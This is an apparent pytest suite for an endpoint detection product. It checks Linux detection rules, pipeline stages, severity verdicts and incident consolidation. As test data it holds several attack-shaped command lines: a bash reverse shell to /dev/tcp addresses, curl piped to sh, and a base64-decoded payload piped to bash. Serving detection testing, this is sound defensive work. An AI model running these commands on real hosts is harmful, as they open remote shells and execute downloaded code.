"""P0-F · the endpoint plane consumes the authoritative detection fabric.

These tests protect the boundary, not just the behaviour: NivXForge EDR
must contribute an endpoint DSM and Linux detection content and must NOT
grow a second engine, registry, rule model or evidence store.
"""
from __future__ import annotations

import json
import os
import uuid

import pytest

from detection_content.library import REGISTRY
from detection_content.library.rules_edr_linux import (
    EDR_LINUX_DETECTION_RULES)
from detection_content.telemetry.nivxforge_sensor_dsm import (
    NivXForgeSensorDSM)
from detection_content.xdr_pipeline import DSM_REGISTRY, evaluate_detection


def _ep(**proc):
    return {"source_vendor": "NivXForge", "source_product": "LinuxSensor",
            "process": proc}


# ── the boundary ──────────────────────────────────────────────────

def test_endpoint_dsm_is_registered_with_the_one_authoritative_registry():
    ids = [d.id for d in DSM_REGISTRY._dsms]
    assert "nivxforge-linux-sensor" in ids
    assert not DSM_REGISTRY.load_failures()
    # The endpoint DSM is APPENDED: it must not displace the pre-existing
    # resolution order.
    assert ids.index("nivxforge-linux-sensor") == len(ids) - 1


def test_the_dsm_claims_only_real_sensor_events():
    dsm = NivXForgeSensorDSM()
    assert dsm.supports({"activity": "PROCESS",
                         "collection_method": "PROC_POLL"})
    assert dsm.supports({"activity": "NETWORK", "sensor_version": "0.1.0"})
    # A bare dict with an `activity` key is NOT an endpoint event — that
    # would attribute an unrelated source to an endpoint.
    assert not dsm.supports({"activity": "PROCESS"})
    assert not dsm.supports({"activity": "LOGIN",
                             "collection_method": "PROC_POLL"})
    assert not dsm.supports("CEF:0|x|y|1|100|thing|5|")


def test_the_canonical_projection_is_not_duplicated():
    """The DSM parser must delegate to the ONE sensor→canonical projection,
    so a schema change cannot silently diverge between the two paths."""
    from edr_plane.canonical_bridge import parse as bridge_parse
    ev = {"activity": "PROCESS", "operation": "PROCESS_OBSERVED",
          "observed_at": "2026-06-06T10:00:00+00:00", "pid": 4, "ppid": 1,
          "image": "bash", "image_path": "/bin/bash",
          "command_line": "bash -l", "user": "root",
          "collection_method": "PROC_POLL",
          "parent_lookup_state": "PARENT_NOT_PRESENT"}
    dsm_canonical = NivXForgeSensorDSM().select_parser().parse(ev)["canonical"]
    expected = bridge_parse(json.dumps(ev))
    for d in (dsm_canonical, expected):
        d.pop("ingest_time", None)     # the only field that is time-of-call
    assert dsm_canonical == expected


def test_no_second_rule_model_or_registry_exists():
    for r in EDR_LINUX_DETECTION_RULES:
        # Same class the enterprise pack uses — not an EDR-specific model.
        assert type(r).__name__ == "DetectionRuleContent"
        assert type(r).__module__.endswith("detection_content.library.models")
    # Evaluated by the same registry that serves every other source.
    assert REGISTRY.get_rule("EDR-LNX-001") is not None


def test_normalizer_refuses_to_invent_a_tenant():
    n = NivXForgeSensorDSM().select_normalizer()
    parsed = {"canonical": {"additional_fields": {}}}
    with pytest.raises(ValueError):
        n.normalize(parsed, "dsm", "c", "i", "t", tenant_id="")


# ── the Linux pack ────────────────────────────────────────────────

def test_every_linux_rule_has_positive_and_negative_evidence():
    assert len(EDR_LINUX_DETECTION_RULES) == 5
    for r in EDR_LINUX_DETECTION_RULES:
        assert r.platform.value.lower() == "linux"
        assert r.rule_id.startswith("EDR-LNX-")
        assert r.mitre_attack, f"{r.rule_id} claims no technique"
        assert r.telemetry_requirements, f"{r.rule_id} states no evidence"
        assert r.false_positive_notes
        assert any(f.should_match for f in r.fixtures), r.rule_id
        assert any(not f.should_match for f in r.fixtures), r.rule_id


def test_linux_rule_fixtures_all_hold():
    for r in EDR_LINUX_DETECTION_RULES:
        for f in r.fixtures:
            assert r.evaluate(f.event) is f.should_match, \
                f"{r.rule_id} · {f.name}"


def test_the_real_shapes_observed_on_this_host_are_detected():
    """The exact command lines the acceptance proof executed for real."""
    cases = {
        "EDR-LNX-001": _ep(executable_path="/usr/bin/bash",
                           command_line="/bin/bash -c while :; do echo "
                                        "c2xlZXAgMg== | base64 -d | bash; "
                                        "done"),
        "EDR-LNX-002": _ep(executable_path="/usr/bin/dash",
                           command_line="/bin/sh /tmp/p0f/payload.sh"),
        "EDR-LNX-003": _ep(executable_path="/usr/bin/bash",
                           command_line="/bin/bash -c while :; do curl -s "
                                        "http://127.0.0.1:1/a.sh | sh; "
                                        "sleep 3; done"),
        "EDR-LNX-004": _ep(executable_path="/usr/bin/bash",
                           command_line="/bin/bash -c while :; do exec "
                                        "3<>/dev/tcp/127.0.0.1/9; sleep 5; "
                                        "done"),
        "EDR-LNX-005": _ep(executable_path="/usr/bin/bash",
                           command_line="/bin/bash -c while :; do chmod +x "
                                        "/tmp/p0f/payload.sh; sleep 2; done"),
    }
    for rule_id, ev in cases.items():
        fired = [d["rule_id"] for d in evaluate_detection(ev)["detections"]]
        assert rule_id in fired, f"{rule_id} did not fire on real shape"


def test_the_benign_controls_stay_benign():
    for cmd, image in (("sleep 95", "/bin/sleep"),
                       ("/bin/sleep 95", "/bin/sleep"),
                       ("ls -la /home", "/bin/ls"),
                       ("cat /tmp/notes.txt", "/usr/bin/cat"),
                       ("curl -o /tmp/a.sh http://x/a.sh", "/usr/bin/curl"),
                       ("base64 /etc/hostname", "/usr/bin/base64"),
                       ("python3 /opt/app/main.py", "/usr/bin/python3")):
        ev = _ep(executable_path=image, command_line=cmd)
        fired = [d["rule_id"] for d in evaluate_detection(ev)["detections"]
                 if d["rule_id"].startswith("EDR-LNX")]
        assert not fired, f"false positive on `{cmd}`: {fired}"


def test_absent_evidence_never_matches():
    """Missing telemetry is not benign — but it is also not a detection.
    A rule must not fire on a command line that was never observed."""
    for proc in ({}, {"executable_path": "/usr/bin/bash"},
                 {"command_line": None, "executable_path": "/usr/bin/bash"}):
        fired = [d["rule_id"] for d in evaluate_detection(_ep(**proc))
                 ["detections"] if d["rule_id"].startswith("EDR-LNX")]
        assert not fired


def test_a_non_endpoint_source_is_never_judged_by_a_linux_rule():
    ev = {"source_vendor": "Microsoft", "source_product": "Windows Security",
          "process": {"executable_path": "/usr/bin/bash",
                      "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}}
    fired = [d["rule_id"] for d in evaluate_detection(ev)["detections"]
             if d["rule_id"].startswith("EDR-LNX")]
    assert not fired


# ── the wire ──────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_real_endpoint_event_traverses_the_existing_pipeline():
    from motor.motor_asyncio import AsyncIOMotorClient
    from detection_content.xdr_pipeline import process_event_through_pipeline
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f-{uuid.uuid4().hex[:8]}"
    ev = {"activity": "PROCESS", "operation": "PROCESS_OBSERVED",
          "observed_at": "2026-06-06T10:00:00+00:00", "pid": 9, "ppid": 1,
          "image": "bash", "image_path": "/usr/bin/bash",
          "command_line": "/bin/bash -c curl -s http://x/a.sh | sh",
          "user": "root", "collection_method": "PROC_POLL",
          "sensor_version": "0.1.0", "parent_lookup_state": "OBSERVED",
          "parent_image": "sshd", "not_observed": []}
    try:
        out = await process_event_through_pipeline(
            db, ev, trace_id=f"raw_{uuid.uuid4().hex[:20]}",
            integration_id="nivxforge-linux-sensor",
            collector_id="ep_test", tenant_id=tenant)
        stages = [s["stage"] for s in out["stages"]]
        # The endpoint event must traverse the SAME stages, in order, with
        # no EDR shortcut around canonicalisation or reasoning.
        for expected in ("dsm", "parser", "normalizer", "canonical_evidence",
                         "detection", "iue", "correlation", "verdict",
                         "incident"):
            assert expected in stages, f"{expected} was bypassed"
        assert out["detection"]["matched"] is True
        assert "EDR-LNX-003" in [d["rule_id"]
                                 for d in out["detection"]["detections"]]
        # Provenance survives to the persisted canonical evidence.
        doc = await db["xdr_canonical_evidence"].find_one(
            {"tenant_id": tenant})
        assert doc["provenance"]["collector_id"] == "ep_test"
        assert doc["provenance"]["dsm_id"] == "nivxforge-linux-sensor"
        # Promotion is the gate's decision, never the detection's.
        assert "created" in out["incident"]
    finally:
        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
        client.close()


@pytest.mark.asyncio
async def test_bridge_records_the_detection_outcome_on_the_raw_event():
    from motor.motor_asyncio import AsyncIOMotorClient
    from edr_plane.canonical_bridge import bridge
    from edr_plane.raw_events import (COLLECTION, RawEndpointEvent, append,
                                      ensure_indexes, get)
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f-{uuid.uuid4().hex[:8]}"
    payload = json.dumps({
        "activity": "PROCESS", "operation": "PROCESS_OBSERVED",
        "observed_at": "2026-06-06T11:00:00+00:00", "start_time": "s1",
        "pid": 11, "ppid": 1, "image": "bash", "image_path": "/usr/bin/bash",
        "command_line": "/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444",
        "user": "root", "collection_method": "PROC_POLL",
        "parent_lookup_state": "PARENT_NOT_PRESENT"})
    try:
        await ensure_indexes(db)
        ev = RawEndpointEvent.build(tenant_id=tenant, source="ep_f",
                                    payload=payload,
                                    trust_state="AUTHENTICATED")
        await append(db, ev)
        out = await bridge(db, raw_id=ev.raw_id, tenant_id=tenant,
                           payload=payload, endpoint_id="ep_f",
                           hostname="lab-01",
                           authentication={"authenticated_endpoint_id":
                                           "ep_f"})
        det = out["detection"]
        assert det["evaluated"] is True, det
        assert "EDR-LNX-004" in det["rule_ids"]
        outcomes = [d["outcome"] for d in
                    (await get(db, tenant_id=tenant,
                               raw_id=ev.raw_id))["derivations"]]
        # Both facts are recorded: evidence was created AND the fabric
        # judged it. Neither is inferred from the other.
        assert "CANONICAL_EVIDENCE_CREATED" in outcomes
        assert "DETECTION_MATCHED" in outcomes
    finally:
        await db[COLLECTION].delete_many({"tenant_id": tenant})
        await db["v2_shadow_observations"].delete_many({"tenant_id": tenant})
        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
        client.close()


@pytest.mark.asyncio
async def test_a_detection_fault_never_destroys_the_evidence_record():
    """If the fabric cannot be reached, canonical evidence must still exist
    and the gap must be stated — a detection gap is not a clean endpoint."""
    from unittest.mock import patch
    from motor.motor_asyncio import AsyncIOMotorClient
    from edr_plane.canonical_bridge import bridge
    from edr_plane.raw_events import (COLLECTION, RawEndpointEvent, append,
                                      ensure_indexes, get)
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f-{uuid.uuid4().hex[:8]}"
    payload = json.dumps({
        "activity": "PROCESS", "operation": "PROCESS_OBSERVED",
        "observed_at": "2026-06-06T12:00:00+00:00", "start_time": "s2",
        "pid": 12, "ppid": 1, "image": "ls", "image_path": "/bin/ls",
        "command_line": "ls -la", "user": "root",
        "collection_method": "PROC_POLL",
        "parent_lookup_state": "PARENT_NOT_PRESENT"})
    try:
        await ensure_indexes(db)
        ev = RawEndpointEvent.build(tenant_id=tenant, source="ep_g",
                                    payload=payload,
                                    trust_state="AUTHENTICATED")
        await append(db, ev)
        with patch("detection_content.xdr_pipeline."
                   "process_event_through_pipeline",
                   side_effect=RuntimeError("fabric unreachable")):
            out = await bridge(db, raw_id=ev.raw_id, tenant_id=tenant,
                               payload=payload, endpoint_id="ep_g",
                               hostname="lab-01", authentication={})
        assert out["canonicalized"] is True
        assert out["detection"]["evaluated"] is False
        d = [x for x in (await get(db, tenant_id=tenant,
                                   raw_id=ev.raw_id))["derivations"]
             if x["outcome"] == "DETECTION_NOT_EVALUATED"]
        assert d and "detection gap" in d[0]["reason"]
    finally:
        await db[COLLECTION].delete_many({"tenant_id": tenant})
        await db["v2_shadow_observations"].delete_many({"tenant_id": tenant})
        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
        client.close()


# ── verdict threshold semantics · P0-F.1 ──────────────────────────
#
# The gate was NOT loosened. The defect was that severity never reached
# the gate for a source that supplies no vendor severity of its own.

def test_rule_severity_supplies_the_band_only_when_the_source_has_none():
    from detection_content.xdr_iue import understand
    canonical = {"event_id": "cev_1", "provenance": {"trace_id": "t"},
                 "process": {"name": "bash"}}
    detection = {"matched": True, "rule_id": "EDR-LNX-004",
                 "detections": [{"rule_id": "EDR-LNX-004",
                                 "severity": "critical"},
                                {"rule_id": "EDR-LNX-002",
                                 "severity": "medium"}]}
    iue = understand(canonical, detection)
    # The most severe rule that fired — a critical behaviour is not
    # diluted by benign-looking company.
    assert iue["severity_hint"] == "CRITICAL"
    assert iue["severity_source"] == "detection.rule_severity"

    # A source that DOES declare a band keeps it: existing CEF/LEEF and
    # snort semantics are untouched.
    banded = understand({**canonical,
                         "security": {"severity_band": "LOW"}}, detection)
    assert banded["severity_hint"] == "LOW"
    assert banded["severity_source"] == "source.security.severity_band"
    numeric = understand({**canonical, "security": {"severity": 1}},
                         detection)
    assert numeric["severity_hint"] == "HIGH"
    assert numeric["severity_source"] == "source.security.severity"


def test_no_detection_means_no_severity_and_no_verdict_inflation():
    from detection_content.xdr_iue import understand
    from detection_content.xdr_veee import compute_verdict
    canonical = {"event_id": "cev_2", "provenance": {"trace_id": "t"},
                 "process": {"name": "ls"}}
    for detection in (None, {"matched": False, "detections": []}):
        iue = understand(canonical, detection)
        assert iue["severity_hint"] == "INFORMATIONAL"
        assert iue["severity_source"] == "none_declared"
        v = compute_verdict(canonical, detection, iue, {})
        assert v["label"] == "INCONCLUSIVE"
        assert v["score"] == 0


def test_the_verdict_bands_and_gate_were_not_moved():
    from detection_content import xdr_veee as veee
    assert veee._WEIGHT_DETECTION_MATCH == 45
    assert veee._LABEL_BANDS == [(80, "MALICIOUS"), (55, "SUSPICIOUS"),
                                 (25, "LIKELY_BENIGN"), (0, "INCONCLUSIVE")]
    assert veee._WEIGHT_SEVERITY["CRITICAL"] == 35


def test_severity_drives_the_verdict_deterministically():
    from detection_content.xdr_iue import understand
    from detection_content.xdr_veee import compute_verdict
    canonical = {"event_id": "cev_3", "provenance": {"trace_id": "t"},
                 "process": {"name": "bash"}}
    expected = {"critical": ("MALICIOUS", 80), "high": ("SUSPICIOUS", 70),
                "medium": ("SUSPICIOUS", 60), "low": ("LIKELY_BENIGN", 50)}
    for sev, (label, score) in expected.items():
        det = {"matched": True, "rule_id": "R",
               "detections": [{"rule_id": "R", "severity": sev}]}
        v = compute_verdict(canonical, det, understand(canonical, det), {})
        assert (v["label"], v["score"]) == (label, score), sev


@pytest.mark.asyncio
async def test_a_critical_endpoint_detection_reaches_a_real_incident():
    from motor.motor_asyncio import AsyncIOMotorClient
    from detection_content.xdr_pipeline import process_event_through_pipeline
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f1-{uuid.uuid4().hex[:8]}"
    ev = {"activity": "PROCESS", "operation": "PROCESS_OBSERVED",
          "observed_at": "2026-06-06T13:00:00+00:00", "pid": 21, "ppid": 1,
          "image": "bash", "image_path": "/usr/bin/bash",
          "command_line": "/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444",
          "user": "root", "collection_method": "PROC_POLL",
          "parent_lookup_state": "OBSERVED", "parent_image": "sshd"}
    try:
        out = await process_event_through_pipeline(
            db, ev, trace_id=f"raw_{uuid.uuid4().hex[:20]}",
            integration_id="nivxforge-linux-sensor",
            collector_id="ep_crit", tenant_id=tenant)
        assert "EDR-LNX-004" in [d["rule_id"]
                                 for d in out["detection"]["detections"]]
        assert out["iue"]["severity_hint"] == "CRITICAL"
        assert out["verdict"]["label"] == "MALICIOUS"
        assert out["verdict"]["score"] == 80
        assert out["incident"]["created"] is True
        inc_id = out["incident"]["incident_id"]
        case = await db["workspace_cases"].find_one({"id": inc_id})
        assert case is not None, "the incident must exist in the store"
        assert case["tenant_id"] == tenant
        assert case["doc_type"] == "xdr_incident"
    finally:
        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
        await db["workspace_cases"].delete_many({"tenant_id": tenant})
        client.close()


@pytest.mark.asyncio
async def test_a_benign_endpoint_event_never_becomes_an_incident():
    from motor.motor_asyncio import AsyncIOMotorClient
    from detection_content.xdr_pipeline import process_event_through_pipeline
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f1-{uuid.uuid4().hex[:8]}"
    ev = {"activity": "PROCESS", "operation": "PROCESS_OBSERVED",
          "observed_at": "2026-06-06T13:05:00+00:00", "pid": 22, "ppid": 1,
          "image": "ls", "image_path": "/bin/ls", "command_line": "ls -la",
          "user": "root", "collection_method": "PROC_POLL",
          "parent_lookup_state": "OBSERVED", "parent_image": "bash"}
    try:
        out = await process_event_through_pipeline(
            db, ev, trace_id=f"raw_{uuid.uuid4().hex[:20]}",
            integration_id="nivxforge-linux-sensor",
            collector_id="ep_benign", tenant_id=tenant)
        assert out["detection"]["matched"] is False
        assert out["incident"]["created"] is False
        assert await db["workspace_cases"].count_documents(
            {"tenant_id": tenant}) == 0
    finally:
        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
        client.close()


# ── P0-F.2 · endpoint incident consolidation + identity ───────────

def _sensor_ev(cmd, image, pid, endpoint="ep_camp1", host="lab-linux-01"):
    return {"activity": "PROCESS", "operation": "PROCESS_OBSERVED",
            "observed_at": "2026-06-06T14:00:00+00:00", "pid": pid,
            "ppid": 1, "image": image.rsplit("/", 1)[-1],
            "image_path": image, "command_line": cmd, "user": "root",
            "collection_method": "PROC_POLL",
            "parent_lookup_state": "OBSERVED", "parent_image": "sshd",
            "endpoint_id": endpoint, "hostname": host}


_ATTACK = [("/bin/bash -c curl -s http://x/a.sh | sh", "/usr/bin/bash", 31),
           ("/bin/sh /tmp/x/payload.sh", "/usr/bin/dash", 32),
           ("/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444",
            "/usr/bin/bash", 33)]


@pytest.mark.asyncio
async def test_one_endpoint_attack_becomes_one_incident_with_all_evidence():
    from motor.motor_asyncio import AsyncIOMotorClient
    from detection_content.xdr_pipeline import process_event_through_pipeline
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f2-{uuid.uuid4().hex[:8]}"
    try:
        results = []
        for cmd, image, pid in _ATTACK:
            out = await process_event_through_pipeline(
                db, _sensor_ev(cmd, image, pid),
                trace_id=f"raw_{uuid.uuid4().hex[:20]}",
                integration_id="nivxforge-linux-sensor",
                collector_id="ep_camp1", tenant_id=tenant)
            results.append(out["incident"])

        assert results[0]["created"] is True
        assert all(r["consolidated"] is True for r in results[1:])
        assert len({r["incident_id"] for r in results}) == 1
        assert await db["workspace_cases"].count_documents(
            {"tenant_id": tenant}) == 1

        case = await db["workspace_cases"].find_one({"tenant_id": tenant})
        camp = case["endpoint_campaign"]
        # NOTHING was dropped: one retained row per contributing
        # observation, and every rule that fired is listed.
        assert len(camp["detections"]) == 3
        assert {"EDR-LNX-002", "EDR-LNX-003",
                "EDR-LNX-004"} <= set(camp["rule_ids"])
        assert all(r["canonical_event_id"] for r in camp["detections"])
        assert all(r["raw_event_id"] for r in camp["detections"])
        # The CRITICAL observation escalated the incident; the later
        # medium one must not have downgraded it.
        assert camp["max_label"] == "MALICIOUS"
        assert camp["max_score"] == 80
        assert case["incident_priority"] == "P1"
        # Title is derived from the behaviour that actually fired.
        assert "lab-linux-01" in case["title"]
        assert "UNKNOWN" not in case["title"]
        assert case["title"].startswith("Reverse-shell shaped command line")
    finally:
        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
        await db["workspace_cases"].delete_many({"tenant_id": tenant})
        client.close()


@pytest.mark.asyncio
async def test_two_endpoints_never_merge_even_on_the_same_rule():
    from motor.motor_asyncio import AsyncIOMotorClient
    from detection_content.xdr_pipeline import process_event_through_pipeline
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f2-{uuid.uuid4().hex[:8]}"
    cmd = "/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444"
    try:
        ids = []
        for ep, host in (("ep_a", "lab-a"), ("ep_b", "lab-b")):
            out = await process_event_through_pipeline(
                db, _sensor_ev(cmd, "/usr/bin/bash", 41, ep, host),
                trace_id=f"raw_{uuid.uuid4().hex[:20]}",
                integration_id="nivxforge-linux-sensor",
                collector_id=ep, tenant_id=tenant)
            assert out["incident"]["created"] is True
            ids.append(out["incident"]["incident_id"])
        assert len(set(ids)) == 2
        assert await db["workspace_cases"].count_documents(
            {"tenant_id": tenant}) == 2
    finally:
        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
        await db["workspace_cases"].delete_many({"tenant_id": tenant})
        client.close()


@pytest.mark.asyncio
async def test_a_later_unrelated_attack_is_its_own_incident():
    """The window rolls from the LAST activity, so a fresh attack after it
    must NOT be swallowed by the earlier campaign."""
    from motor.motor_asyncio import AsyncIOMotorClient
    from detection_content.xdr_pipeline import process_event_through_pipeline
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f2-{uuid.uuid4().hex[:8]}"
    cmd = "/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444"
    try:
        first = await process_event_through_pipeline(
            db, _sensor_ev(cmd, "/usr/bin/bash", 51),
            trace_id=f"raw_{uuid.uuid4().hex[:20]}",
            integration_id="nivxforge-linux-sensor",
            collector_id="ep_camp1", tenant_id=tenant)
        assert first["incident"]["created"] is True
        # Age the campaign past its window (what the clock would do).
        await db["workspace_cases"].update_one(
            {"id": first["incident"]["incident_id"]},
            {"$set": {"endpoint_campaign.last_activity_at":
                      "2020-01-01T00:00:00+00:00"}})
        second = await process_event_through_pipeline(
            db, _sensor_ev(cmd, "/usr/bin/bash", 52),
            trace_id=f"raw_{uuid.uuid4().hex[:20]}",
            integration_id="nivxforge-linux-sensor",
            collector_id="ep_camp1", tenant_id=tenant)
        assert second["incident"]["created"] is True
        assert (second["incident"]["incident_id"]
                != first["incident"]["incident_id"])
        assert await db["workspace_cases"].count_documents(
            {"tenant_id": tenant}) == 2
    finally:
        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
        await db["workspace_cases"].delete_many({"tenant_id": tenant})
        client.close()


@pytest.mark.asyncio
async def test_a_closed_incident_is_never_silently_reopened():
    from motor.motor_asyncio import AsyncIOMotorClient
    from detection_content.xdr_pipeline import process_event_through_pipeline
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f2-{uuid.uuid4().hex[:8]}"
    cmd = "/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444"
    try:
        first = await process_event_through_pipeline(
            db, _sensor_ev(cmd, "/usr/bin/bash", 61),
            trace_id=f"raw_{uuid.uuid4().hex[:20]}",
            integration_id="nivxforge-linux-sensor",
            collector_id="ep_camp1", tenant_id=tenant)
        await db["workspace_cases"].update_one(
            {"id": first["incident"]["incident_id"]},
            {"$set": {"incident_state": "closed"}})
        second = await process_event_through_pipeline(
            db, _sensor_ev(cmd, "/usr/bin/bash", 62),
            trace_id=f"raw_{uuid.uuid4().hex[:20]}",
            integration_id="nivxforge-linux-sensor",
            collector_id="ep_camp1", tenant_id=tenant)
        assert second["incident"]["created"] is True
        assert await db["workspace_cases"].count_documents(
            {"tenant_id": tenant}) == 2
    finally:
        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
        await db["workspace_cases"].delete_many({"tenant_id": tenant})
        client.close()


@pytest.mark.asyncio
async def test_non_endpoint_sources_keep_their_existing_behaviour():
    """CEF/LEEF and snort must be untouched: no campaign scope, no
    consolidation, and the original network-shaped title."""
    from motor.motor_asyncio import AsyncIOMotorClient
    from detection_content.xdr_incident import materialise_incident
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f2-{uuid.uuid4().hex[:8]}"
    canonical = {"event_id": "cev_net_1", "provenance": {"trace_id": "t"},
                 "network": {"dest_ip": "10.0.0.5"},
                 "security": {"signature": {"id": "2001219"}}}
    verdict = {"label": "MALICIOUS", "score": 85, "reason": "r",
               "engine_id": "veee", "contributors": []}
    try:
        ids = []
        for i in range(2):
            out = await materialise_incident(
                db, canonical, {"iue_id": "i"}, {}, {"matched": True},
                verdict, trace_id=f"t{i}", tenant_id=tenant)
            assert out["created"] is True
            ids.append(out["incident_id"])
        assert len(set(ids)) == 2, "network incidents must not consolidate"
        doc = await db["workspace_cases"].find_one({"id": ids[0]})
        assert doc["title"] == "Malicious — sig 2001219 → 10.0.0.5"
        assert "endpoint_campaign" not in doc
    finally:
        await db["workspace_cases"].delete_many({"tenant_id": tenant})
        client.close()


def test_the_primary_behaviour_is_the_most_severe_rule_deterministically():
    from detection_content.xdr_incident import (_endpoint_title,
                                                _primary_behaviour)
    det = {"matched": True, "detections": [
        {"rule_id": "R-LOW", "name": "Low thing", "severity": "low"},
        {"rule_id": "R-CRIT", "name": "Critical thing",
         "severity": "critical"},
        {"rule_id": "R-MED", "name": "Medium thing", "severity": "medium"}]}
    assert _primary_behaviour(det)["rule_id"] == "R-CRIT"
    canonical = {"additional_fields": {"endpoint_id": "ep_x"},
                 "host": {"hostname": "lab-9"}}
    assert _endpoint_title("MALICIOUS", canonical, det) == \
        "Critical thing — lab-9"
    # No rule fired → nothing to name, so the generic namer stays in
    # charge rather than inventing a behaviour.
    assert _endpoint_title("MALICIOUS", canonical,
                           {"matched": False, "detections": []}) is None
    # No endpoint identity → not an endpoint incident.
    assert _endpoint_title("MALICIOUS", {"host": {"hostname": "h"}},
                           det) is None
    # Hostname absent → fall back to the platform-minted id, never UNKNOWN.
    assert _endpoint_title("MALICIOUS",
                           {"additional_fields": {"endpoint_id": "ep_x"}},
                           det) == "Critical thing — ep_x"
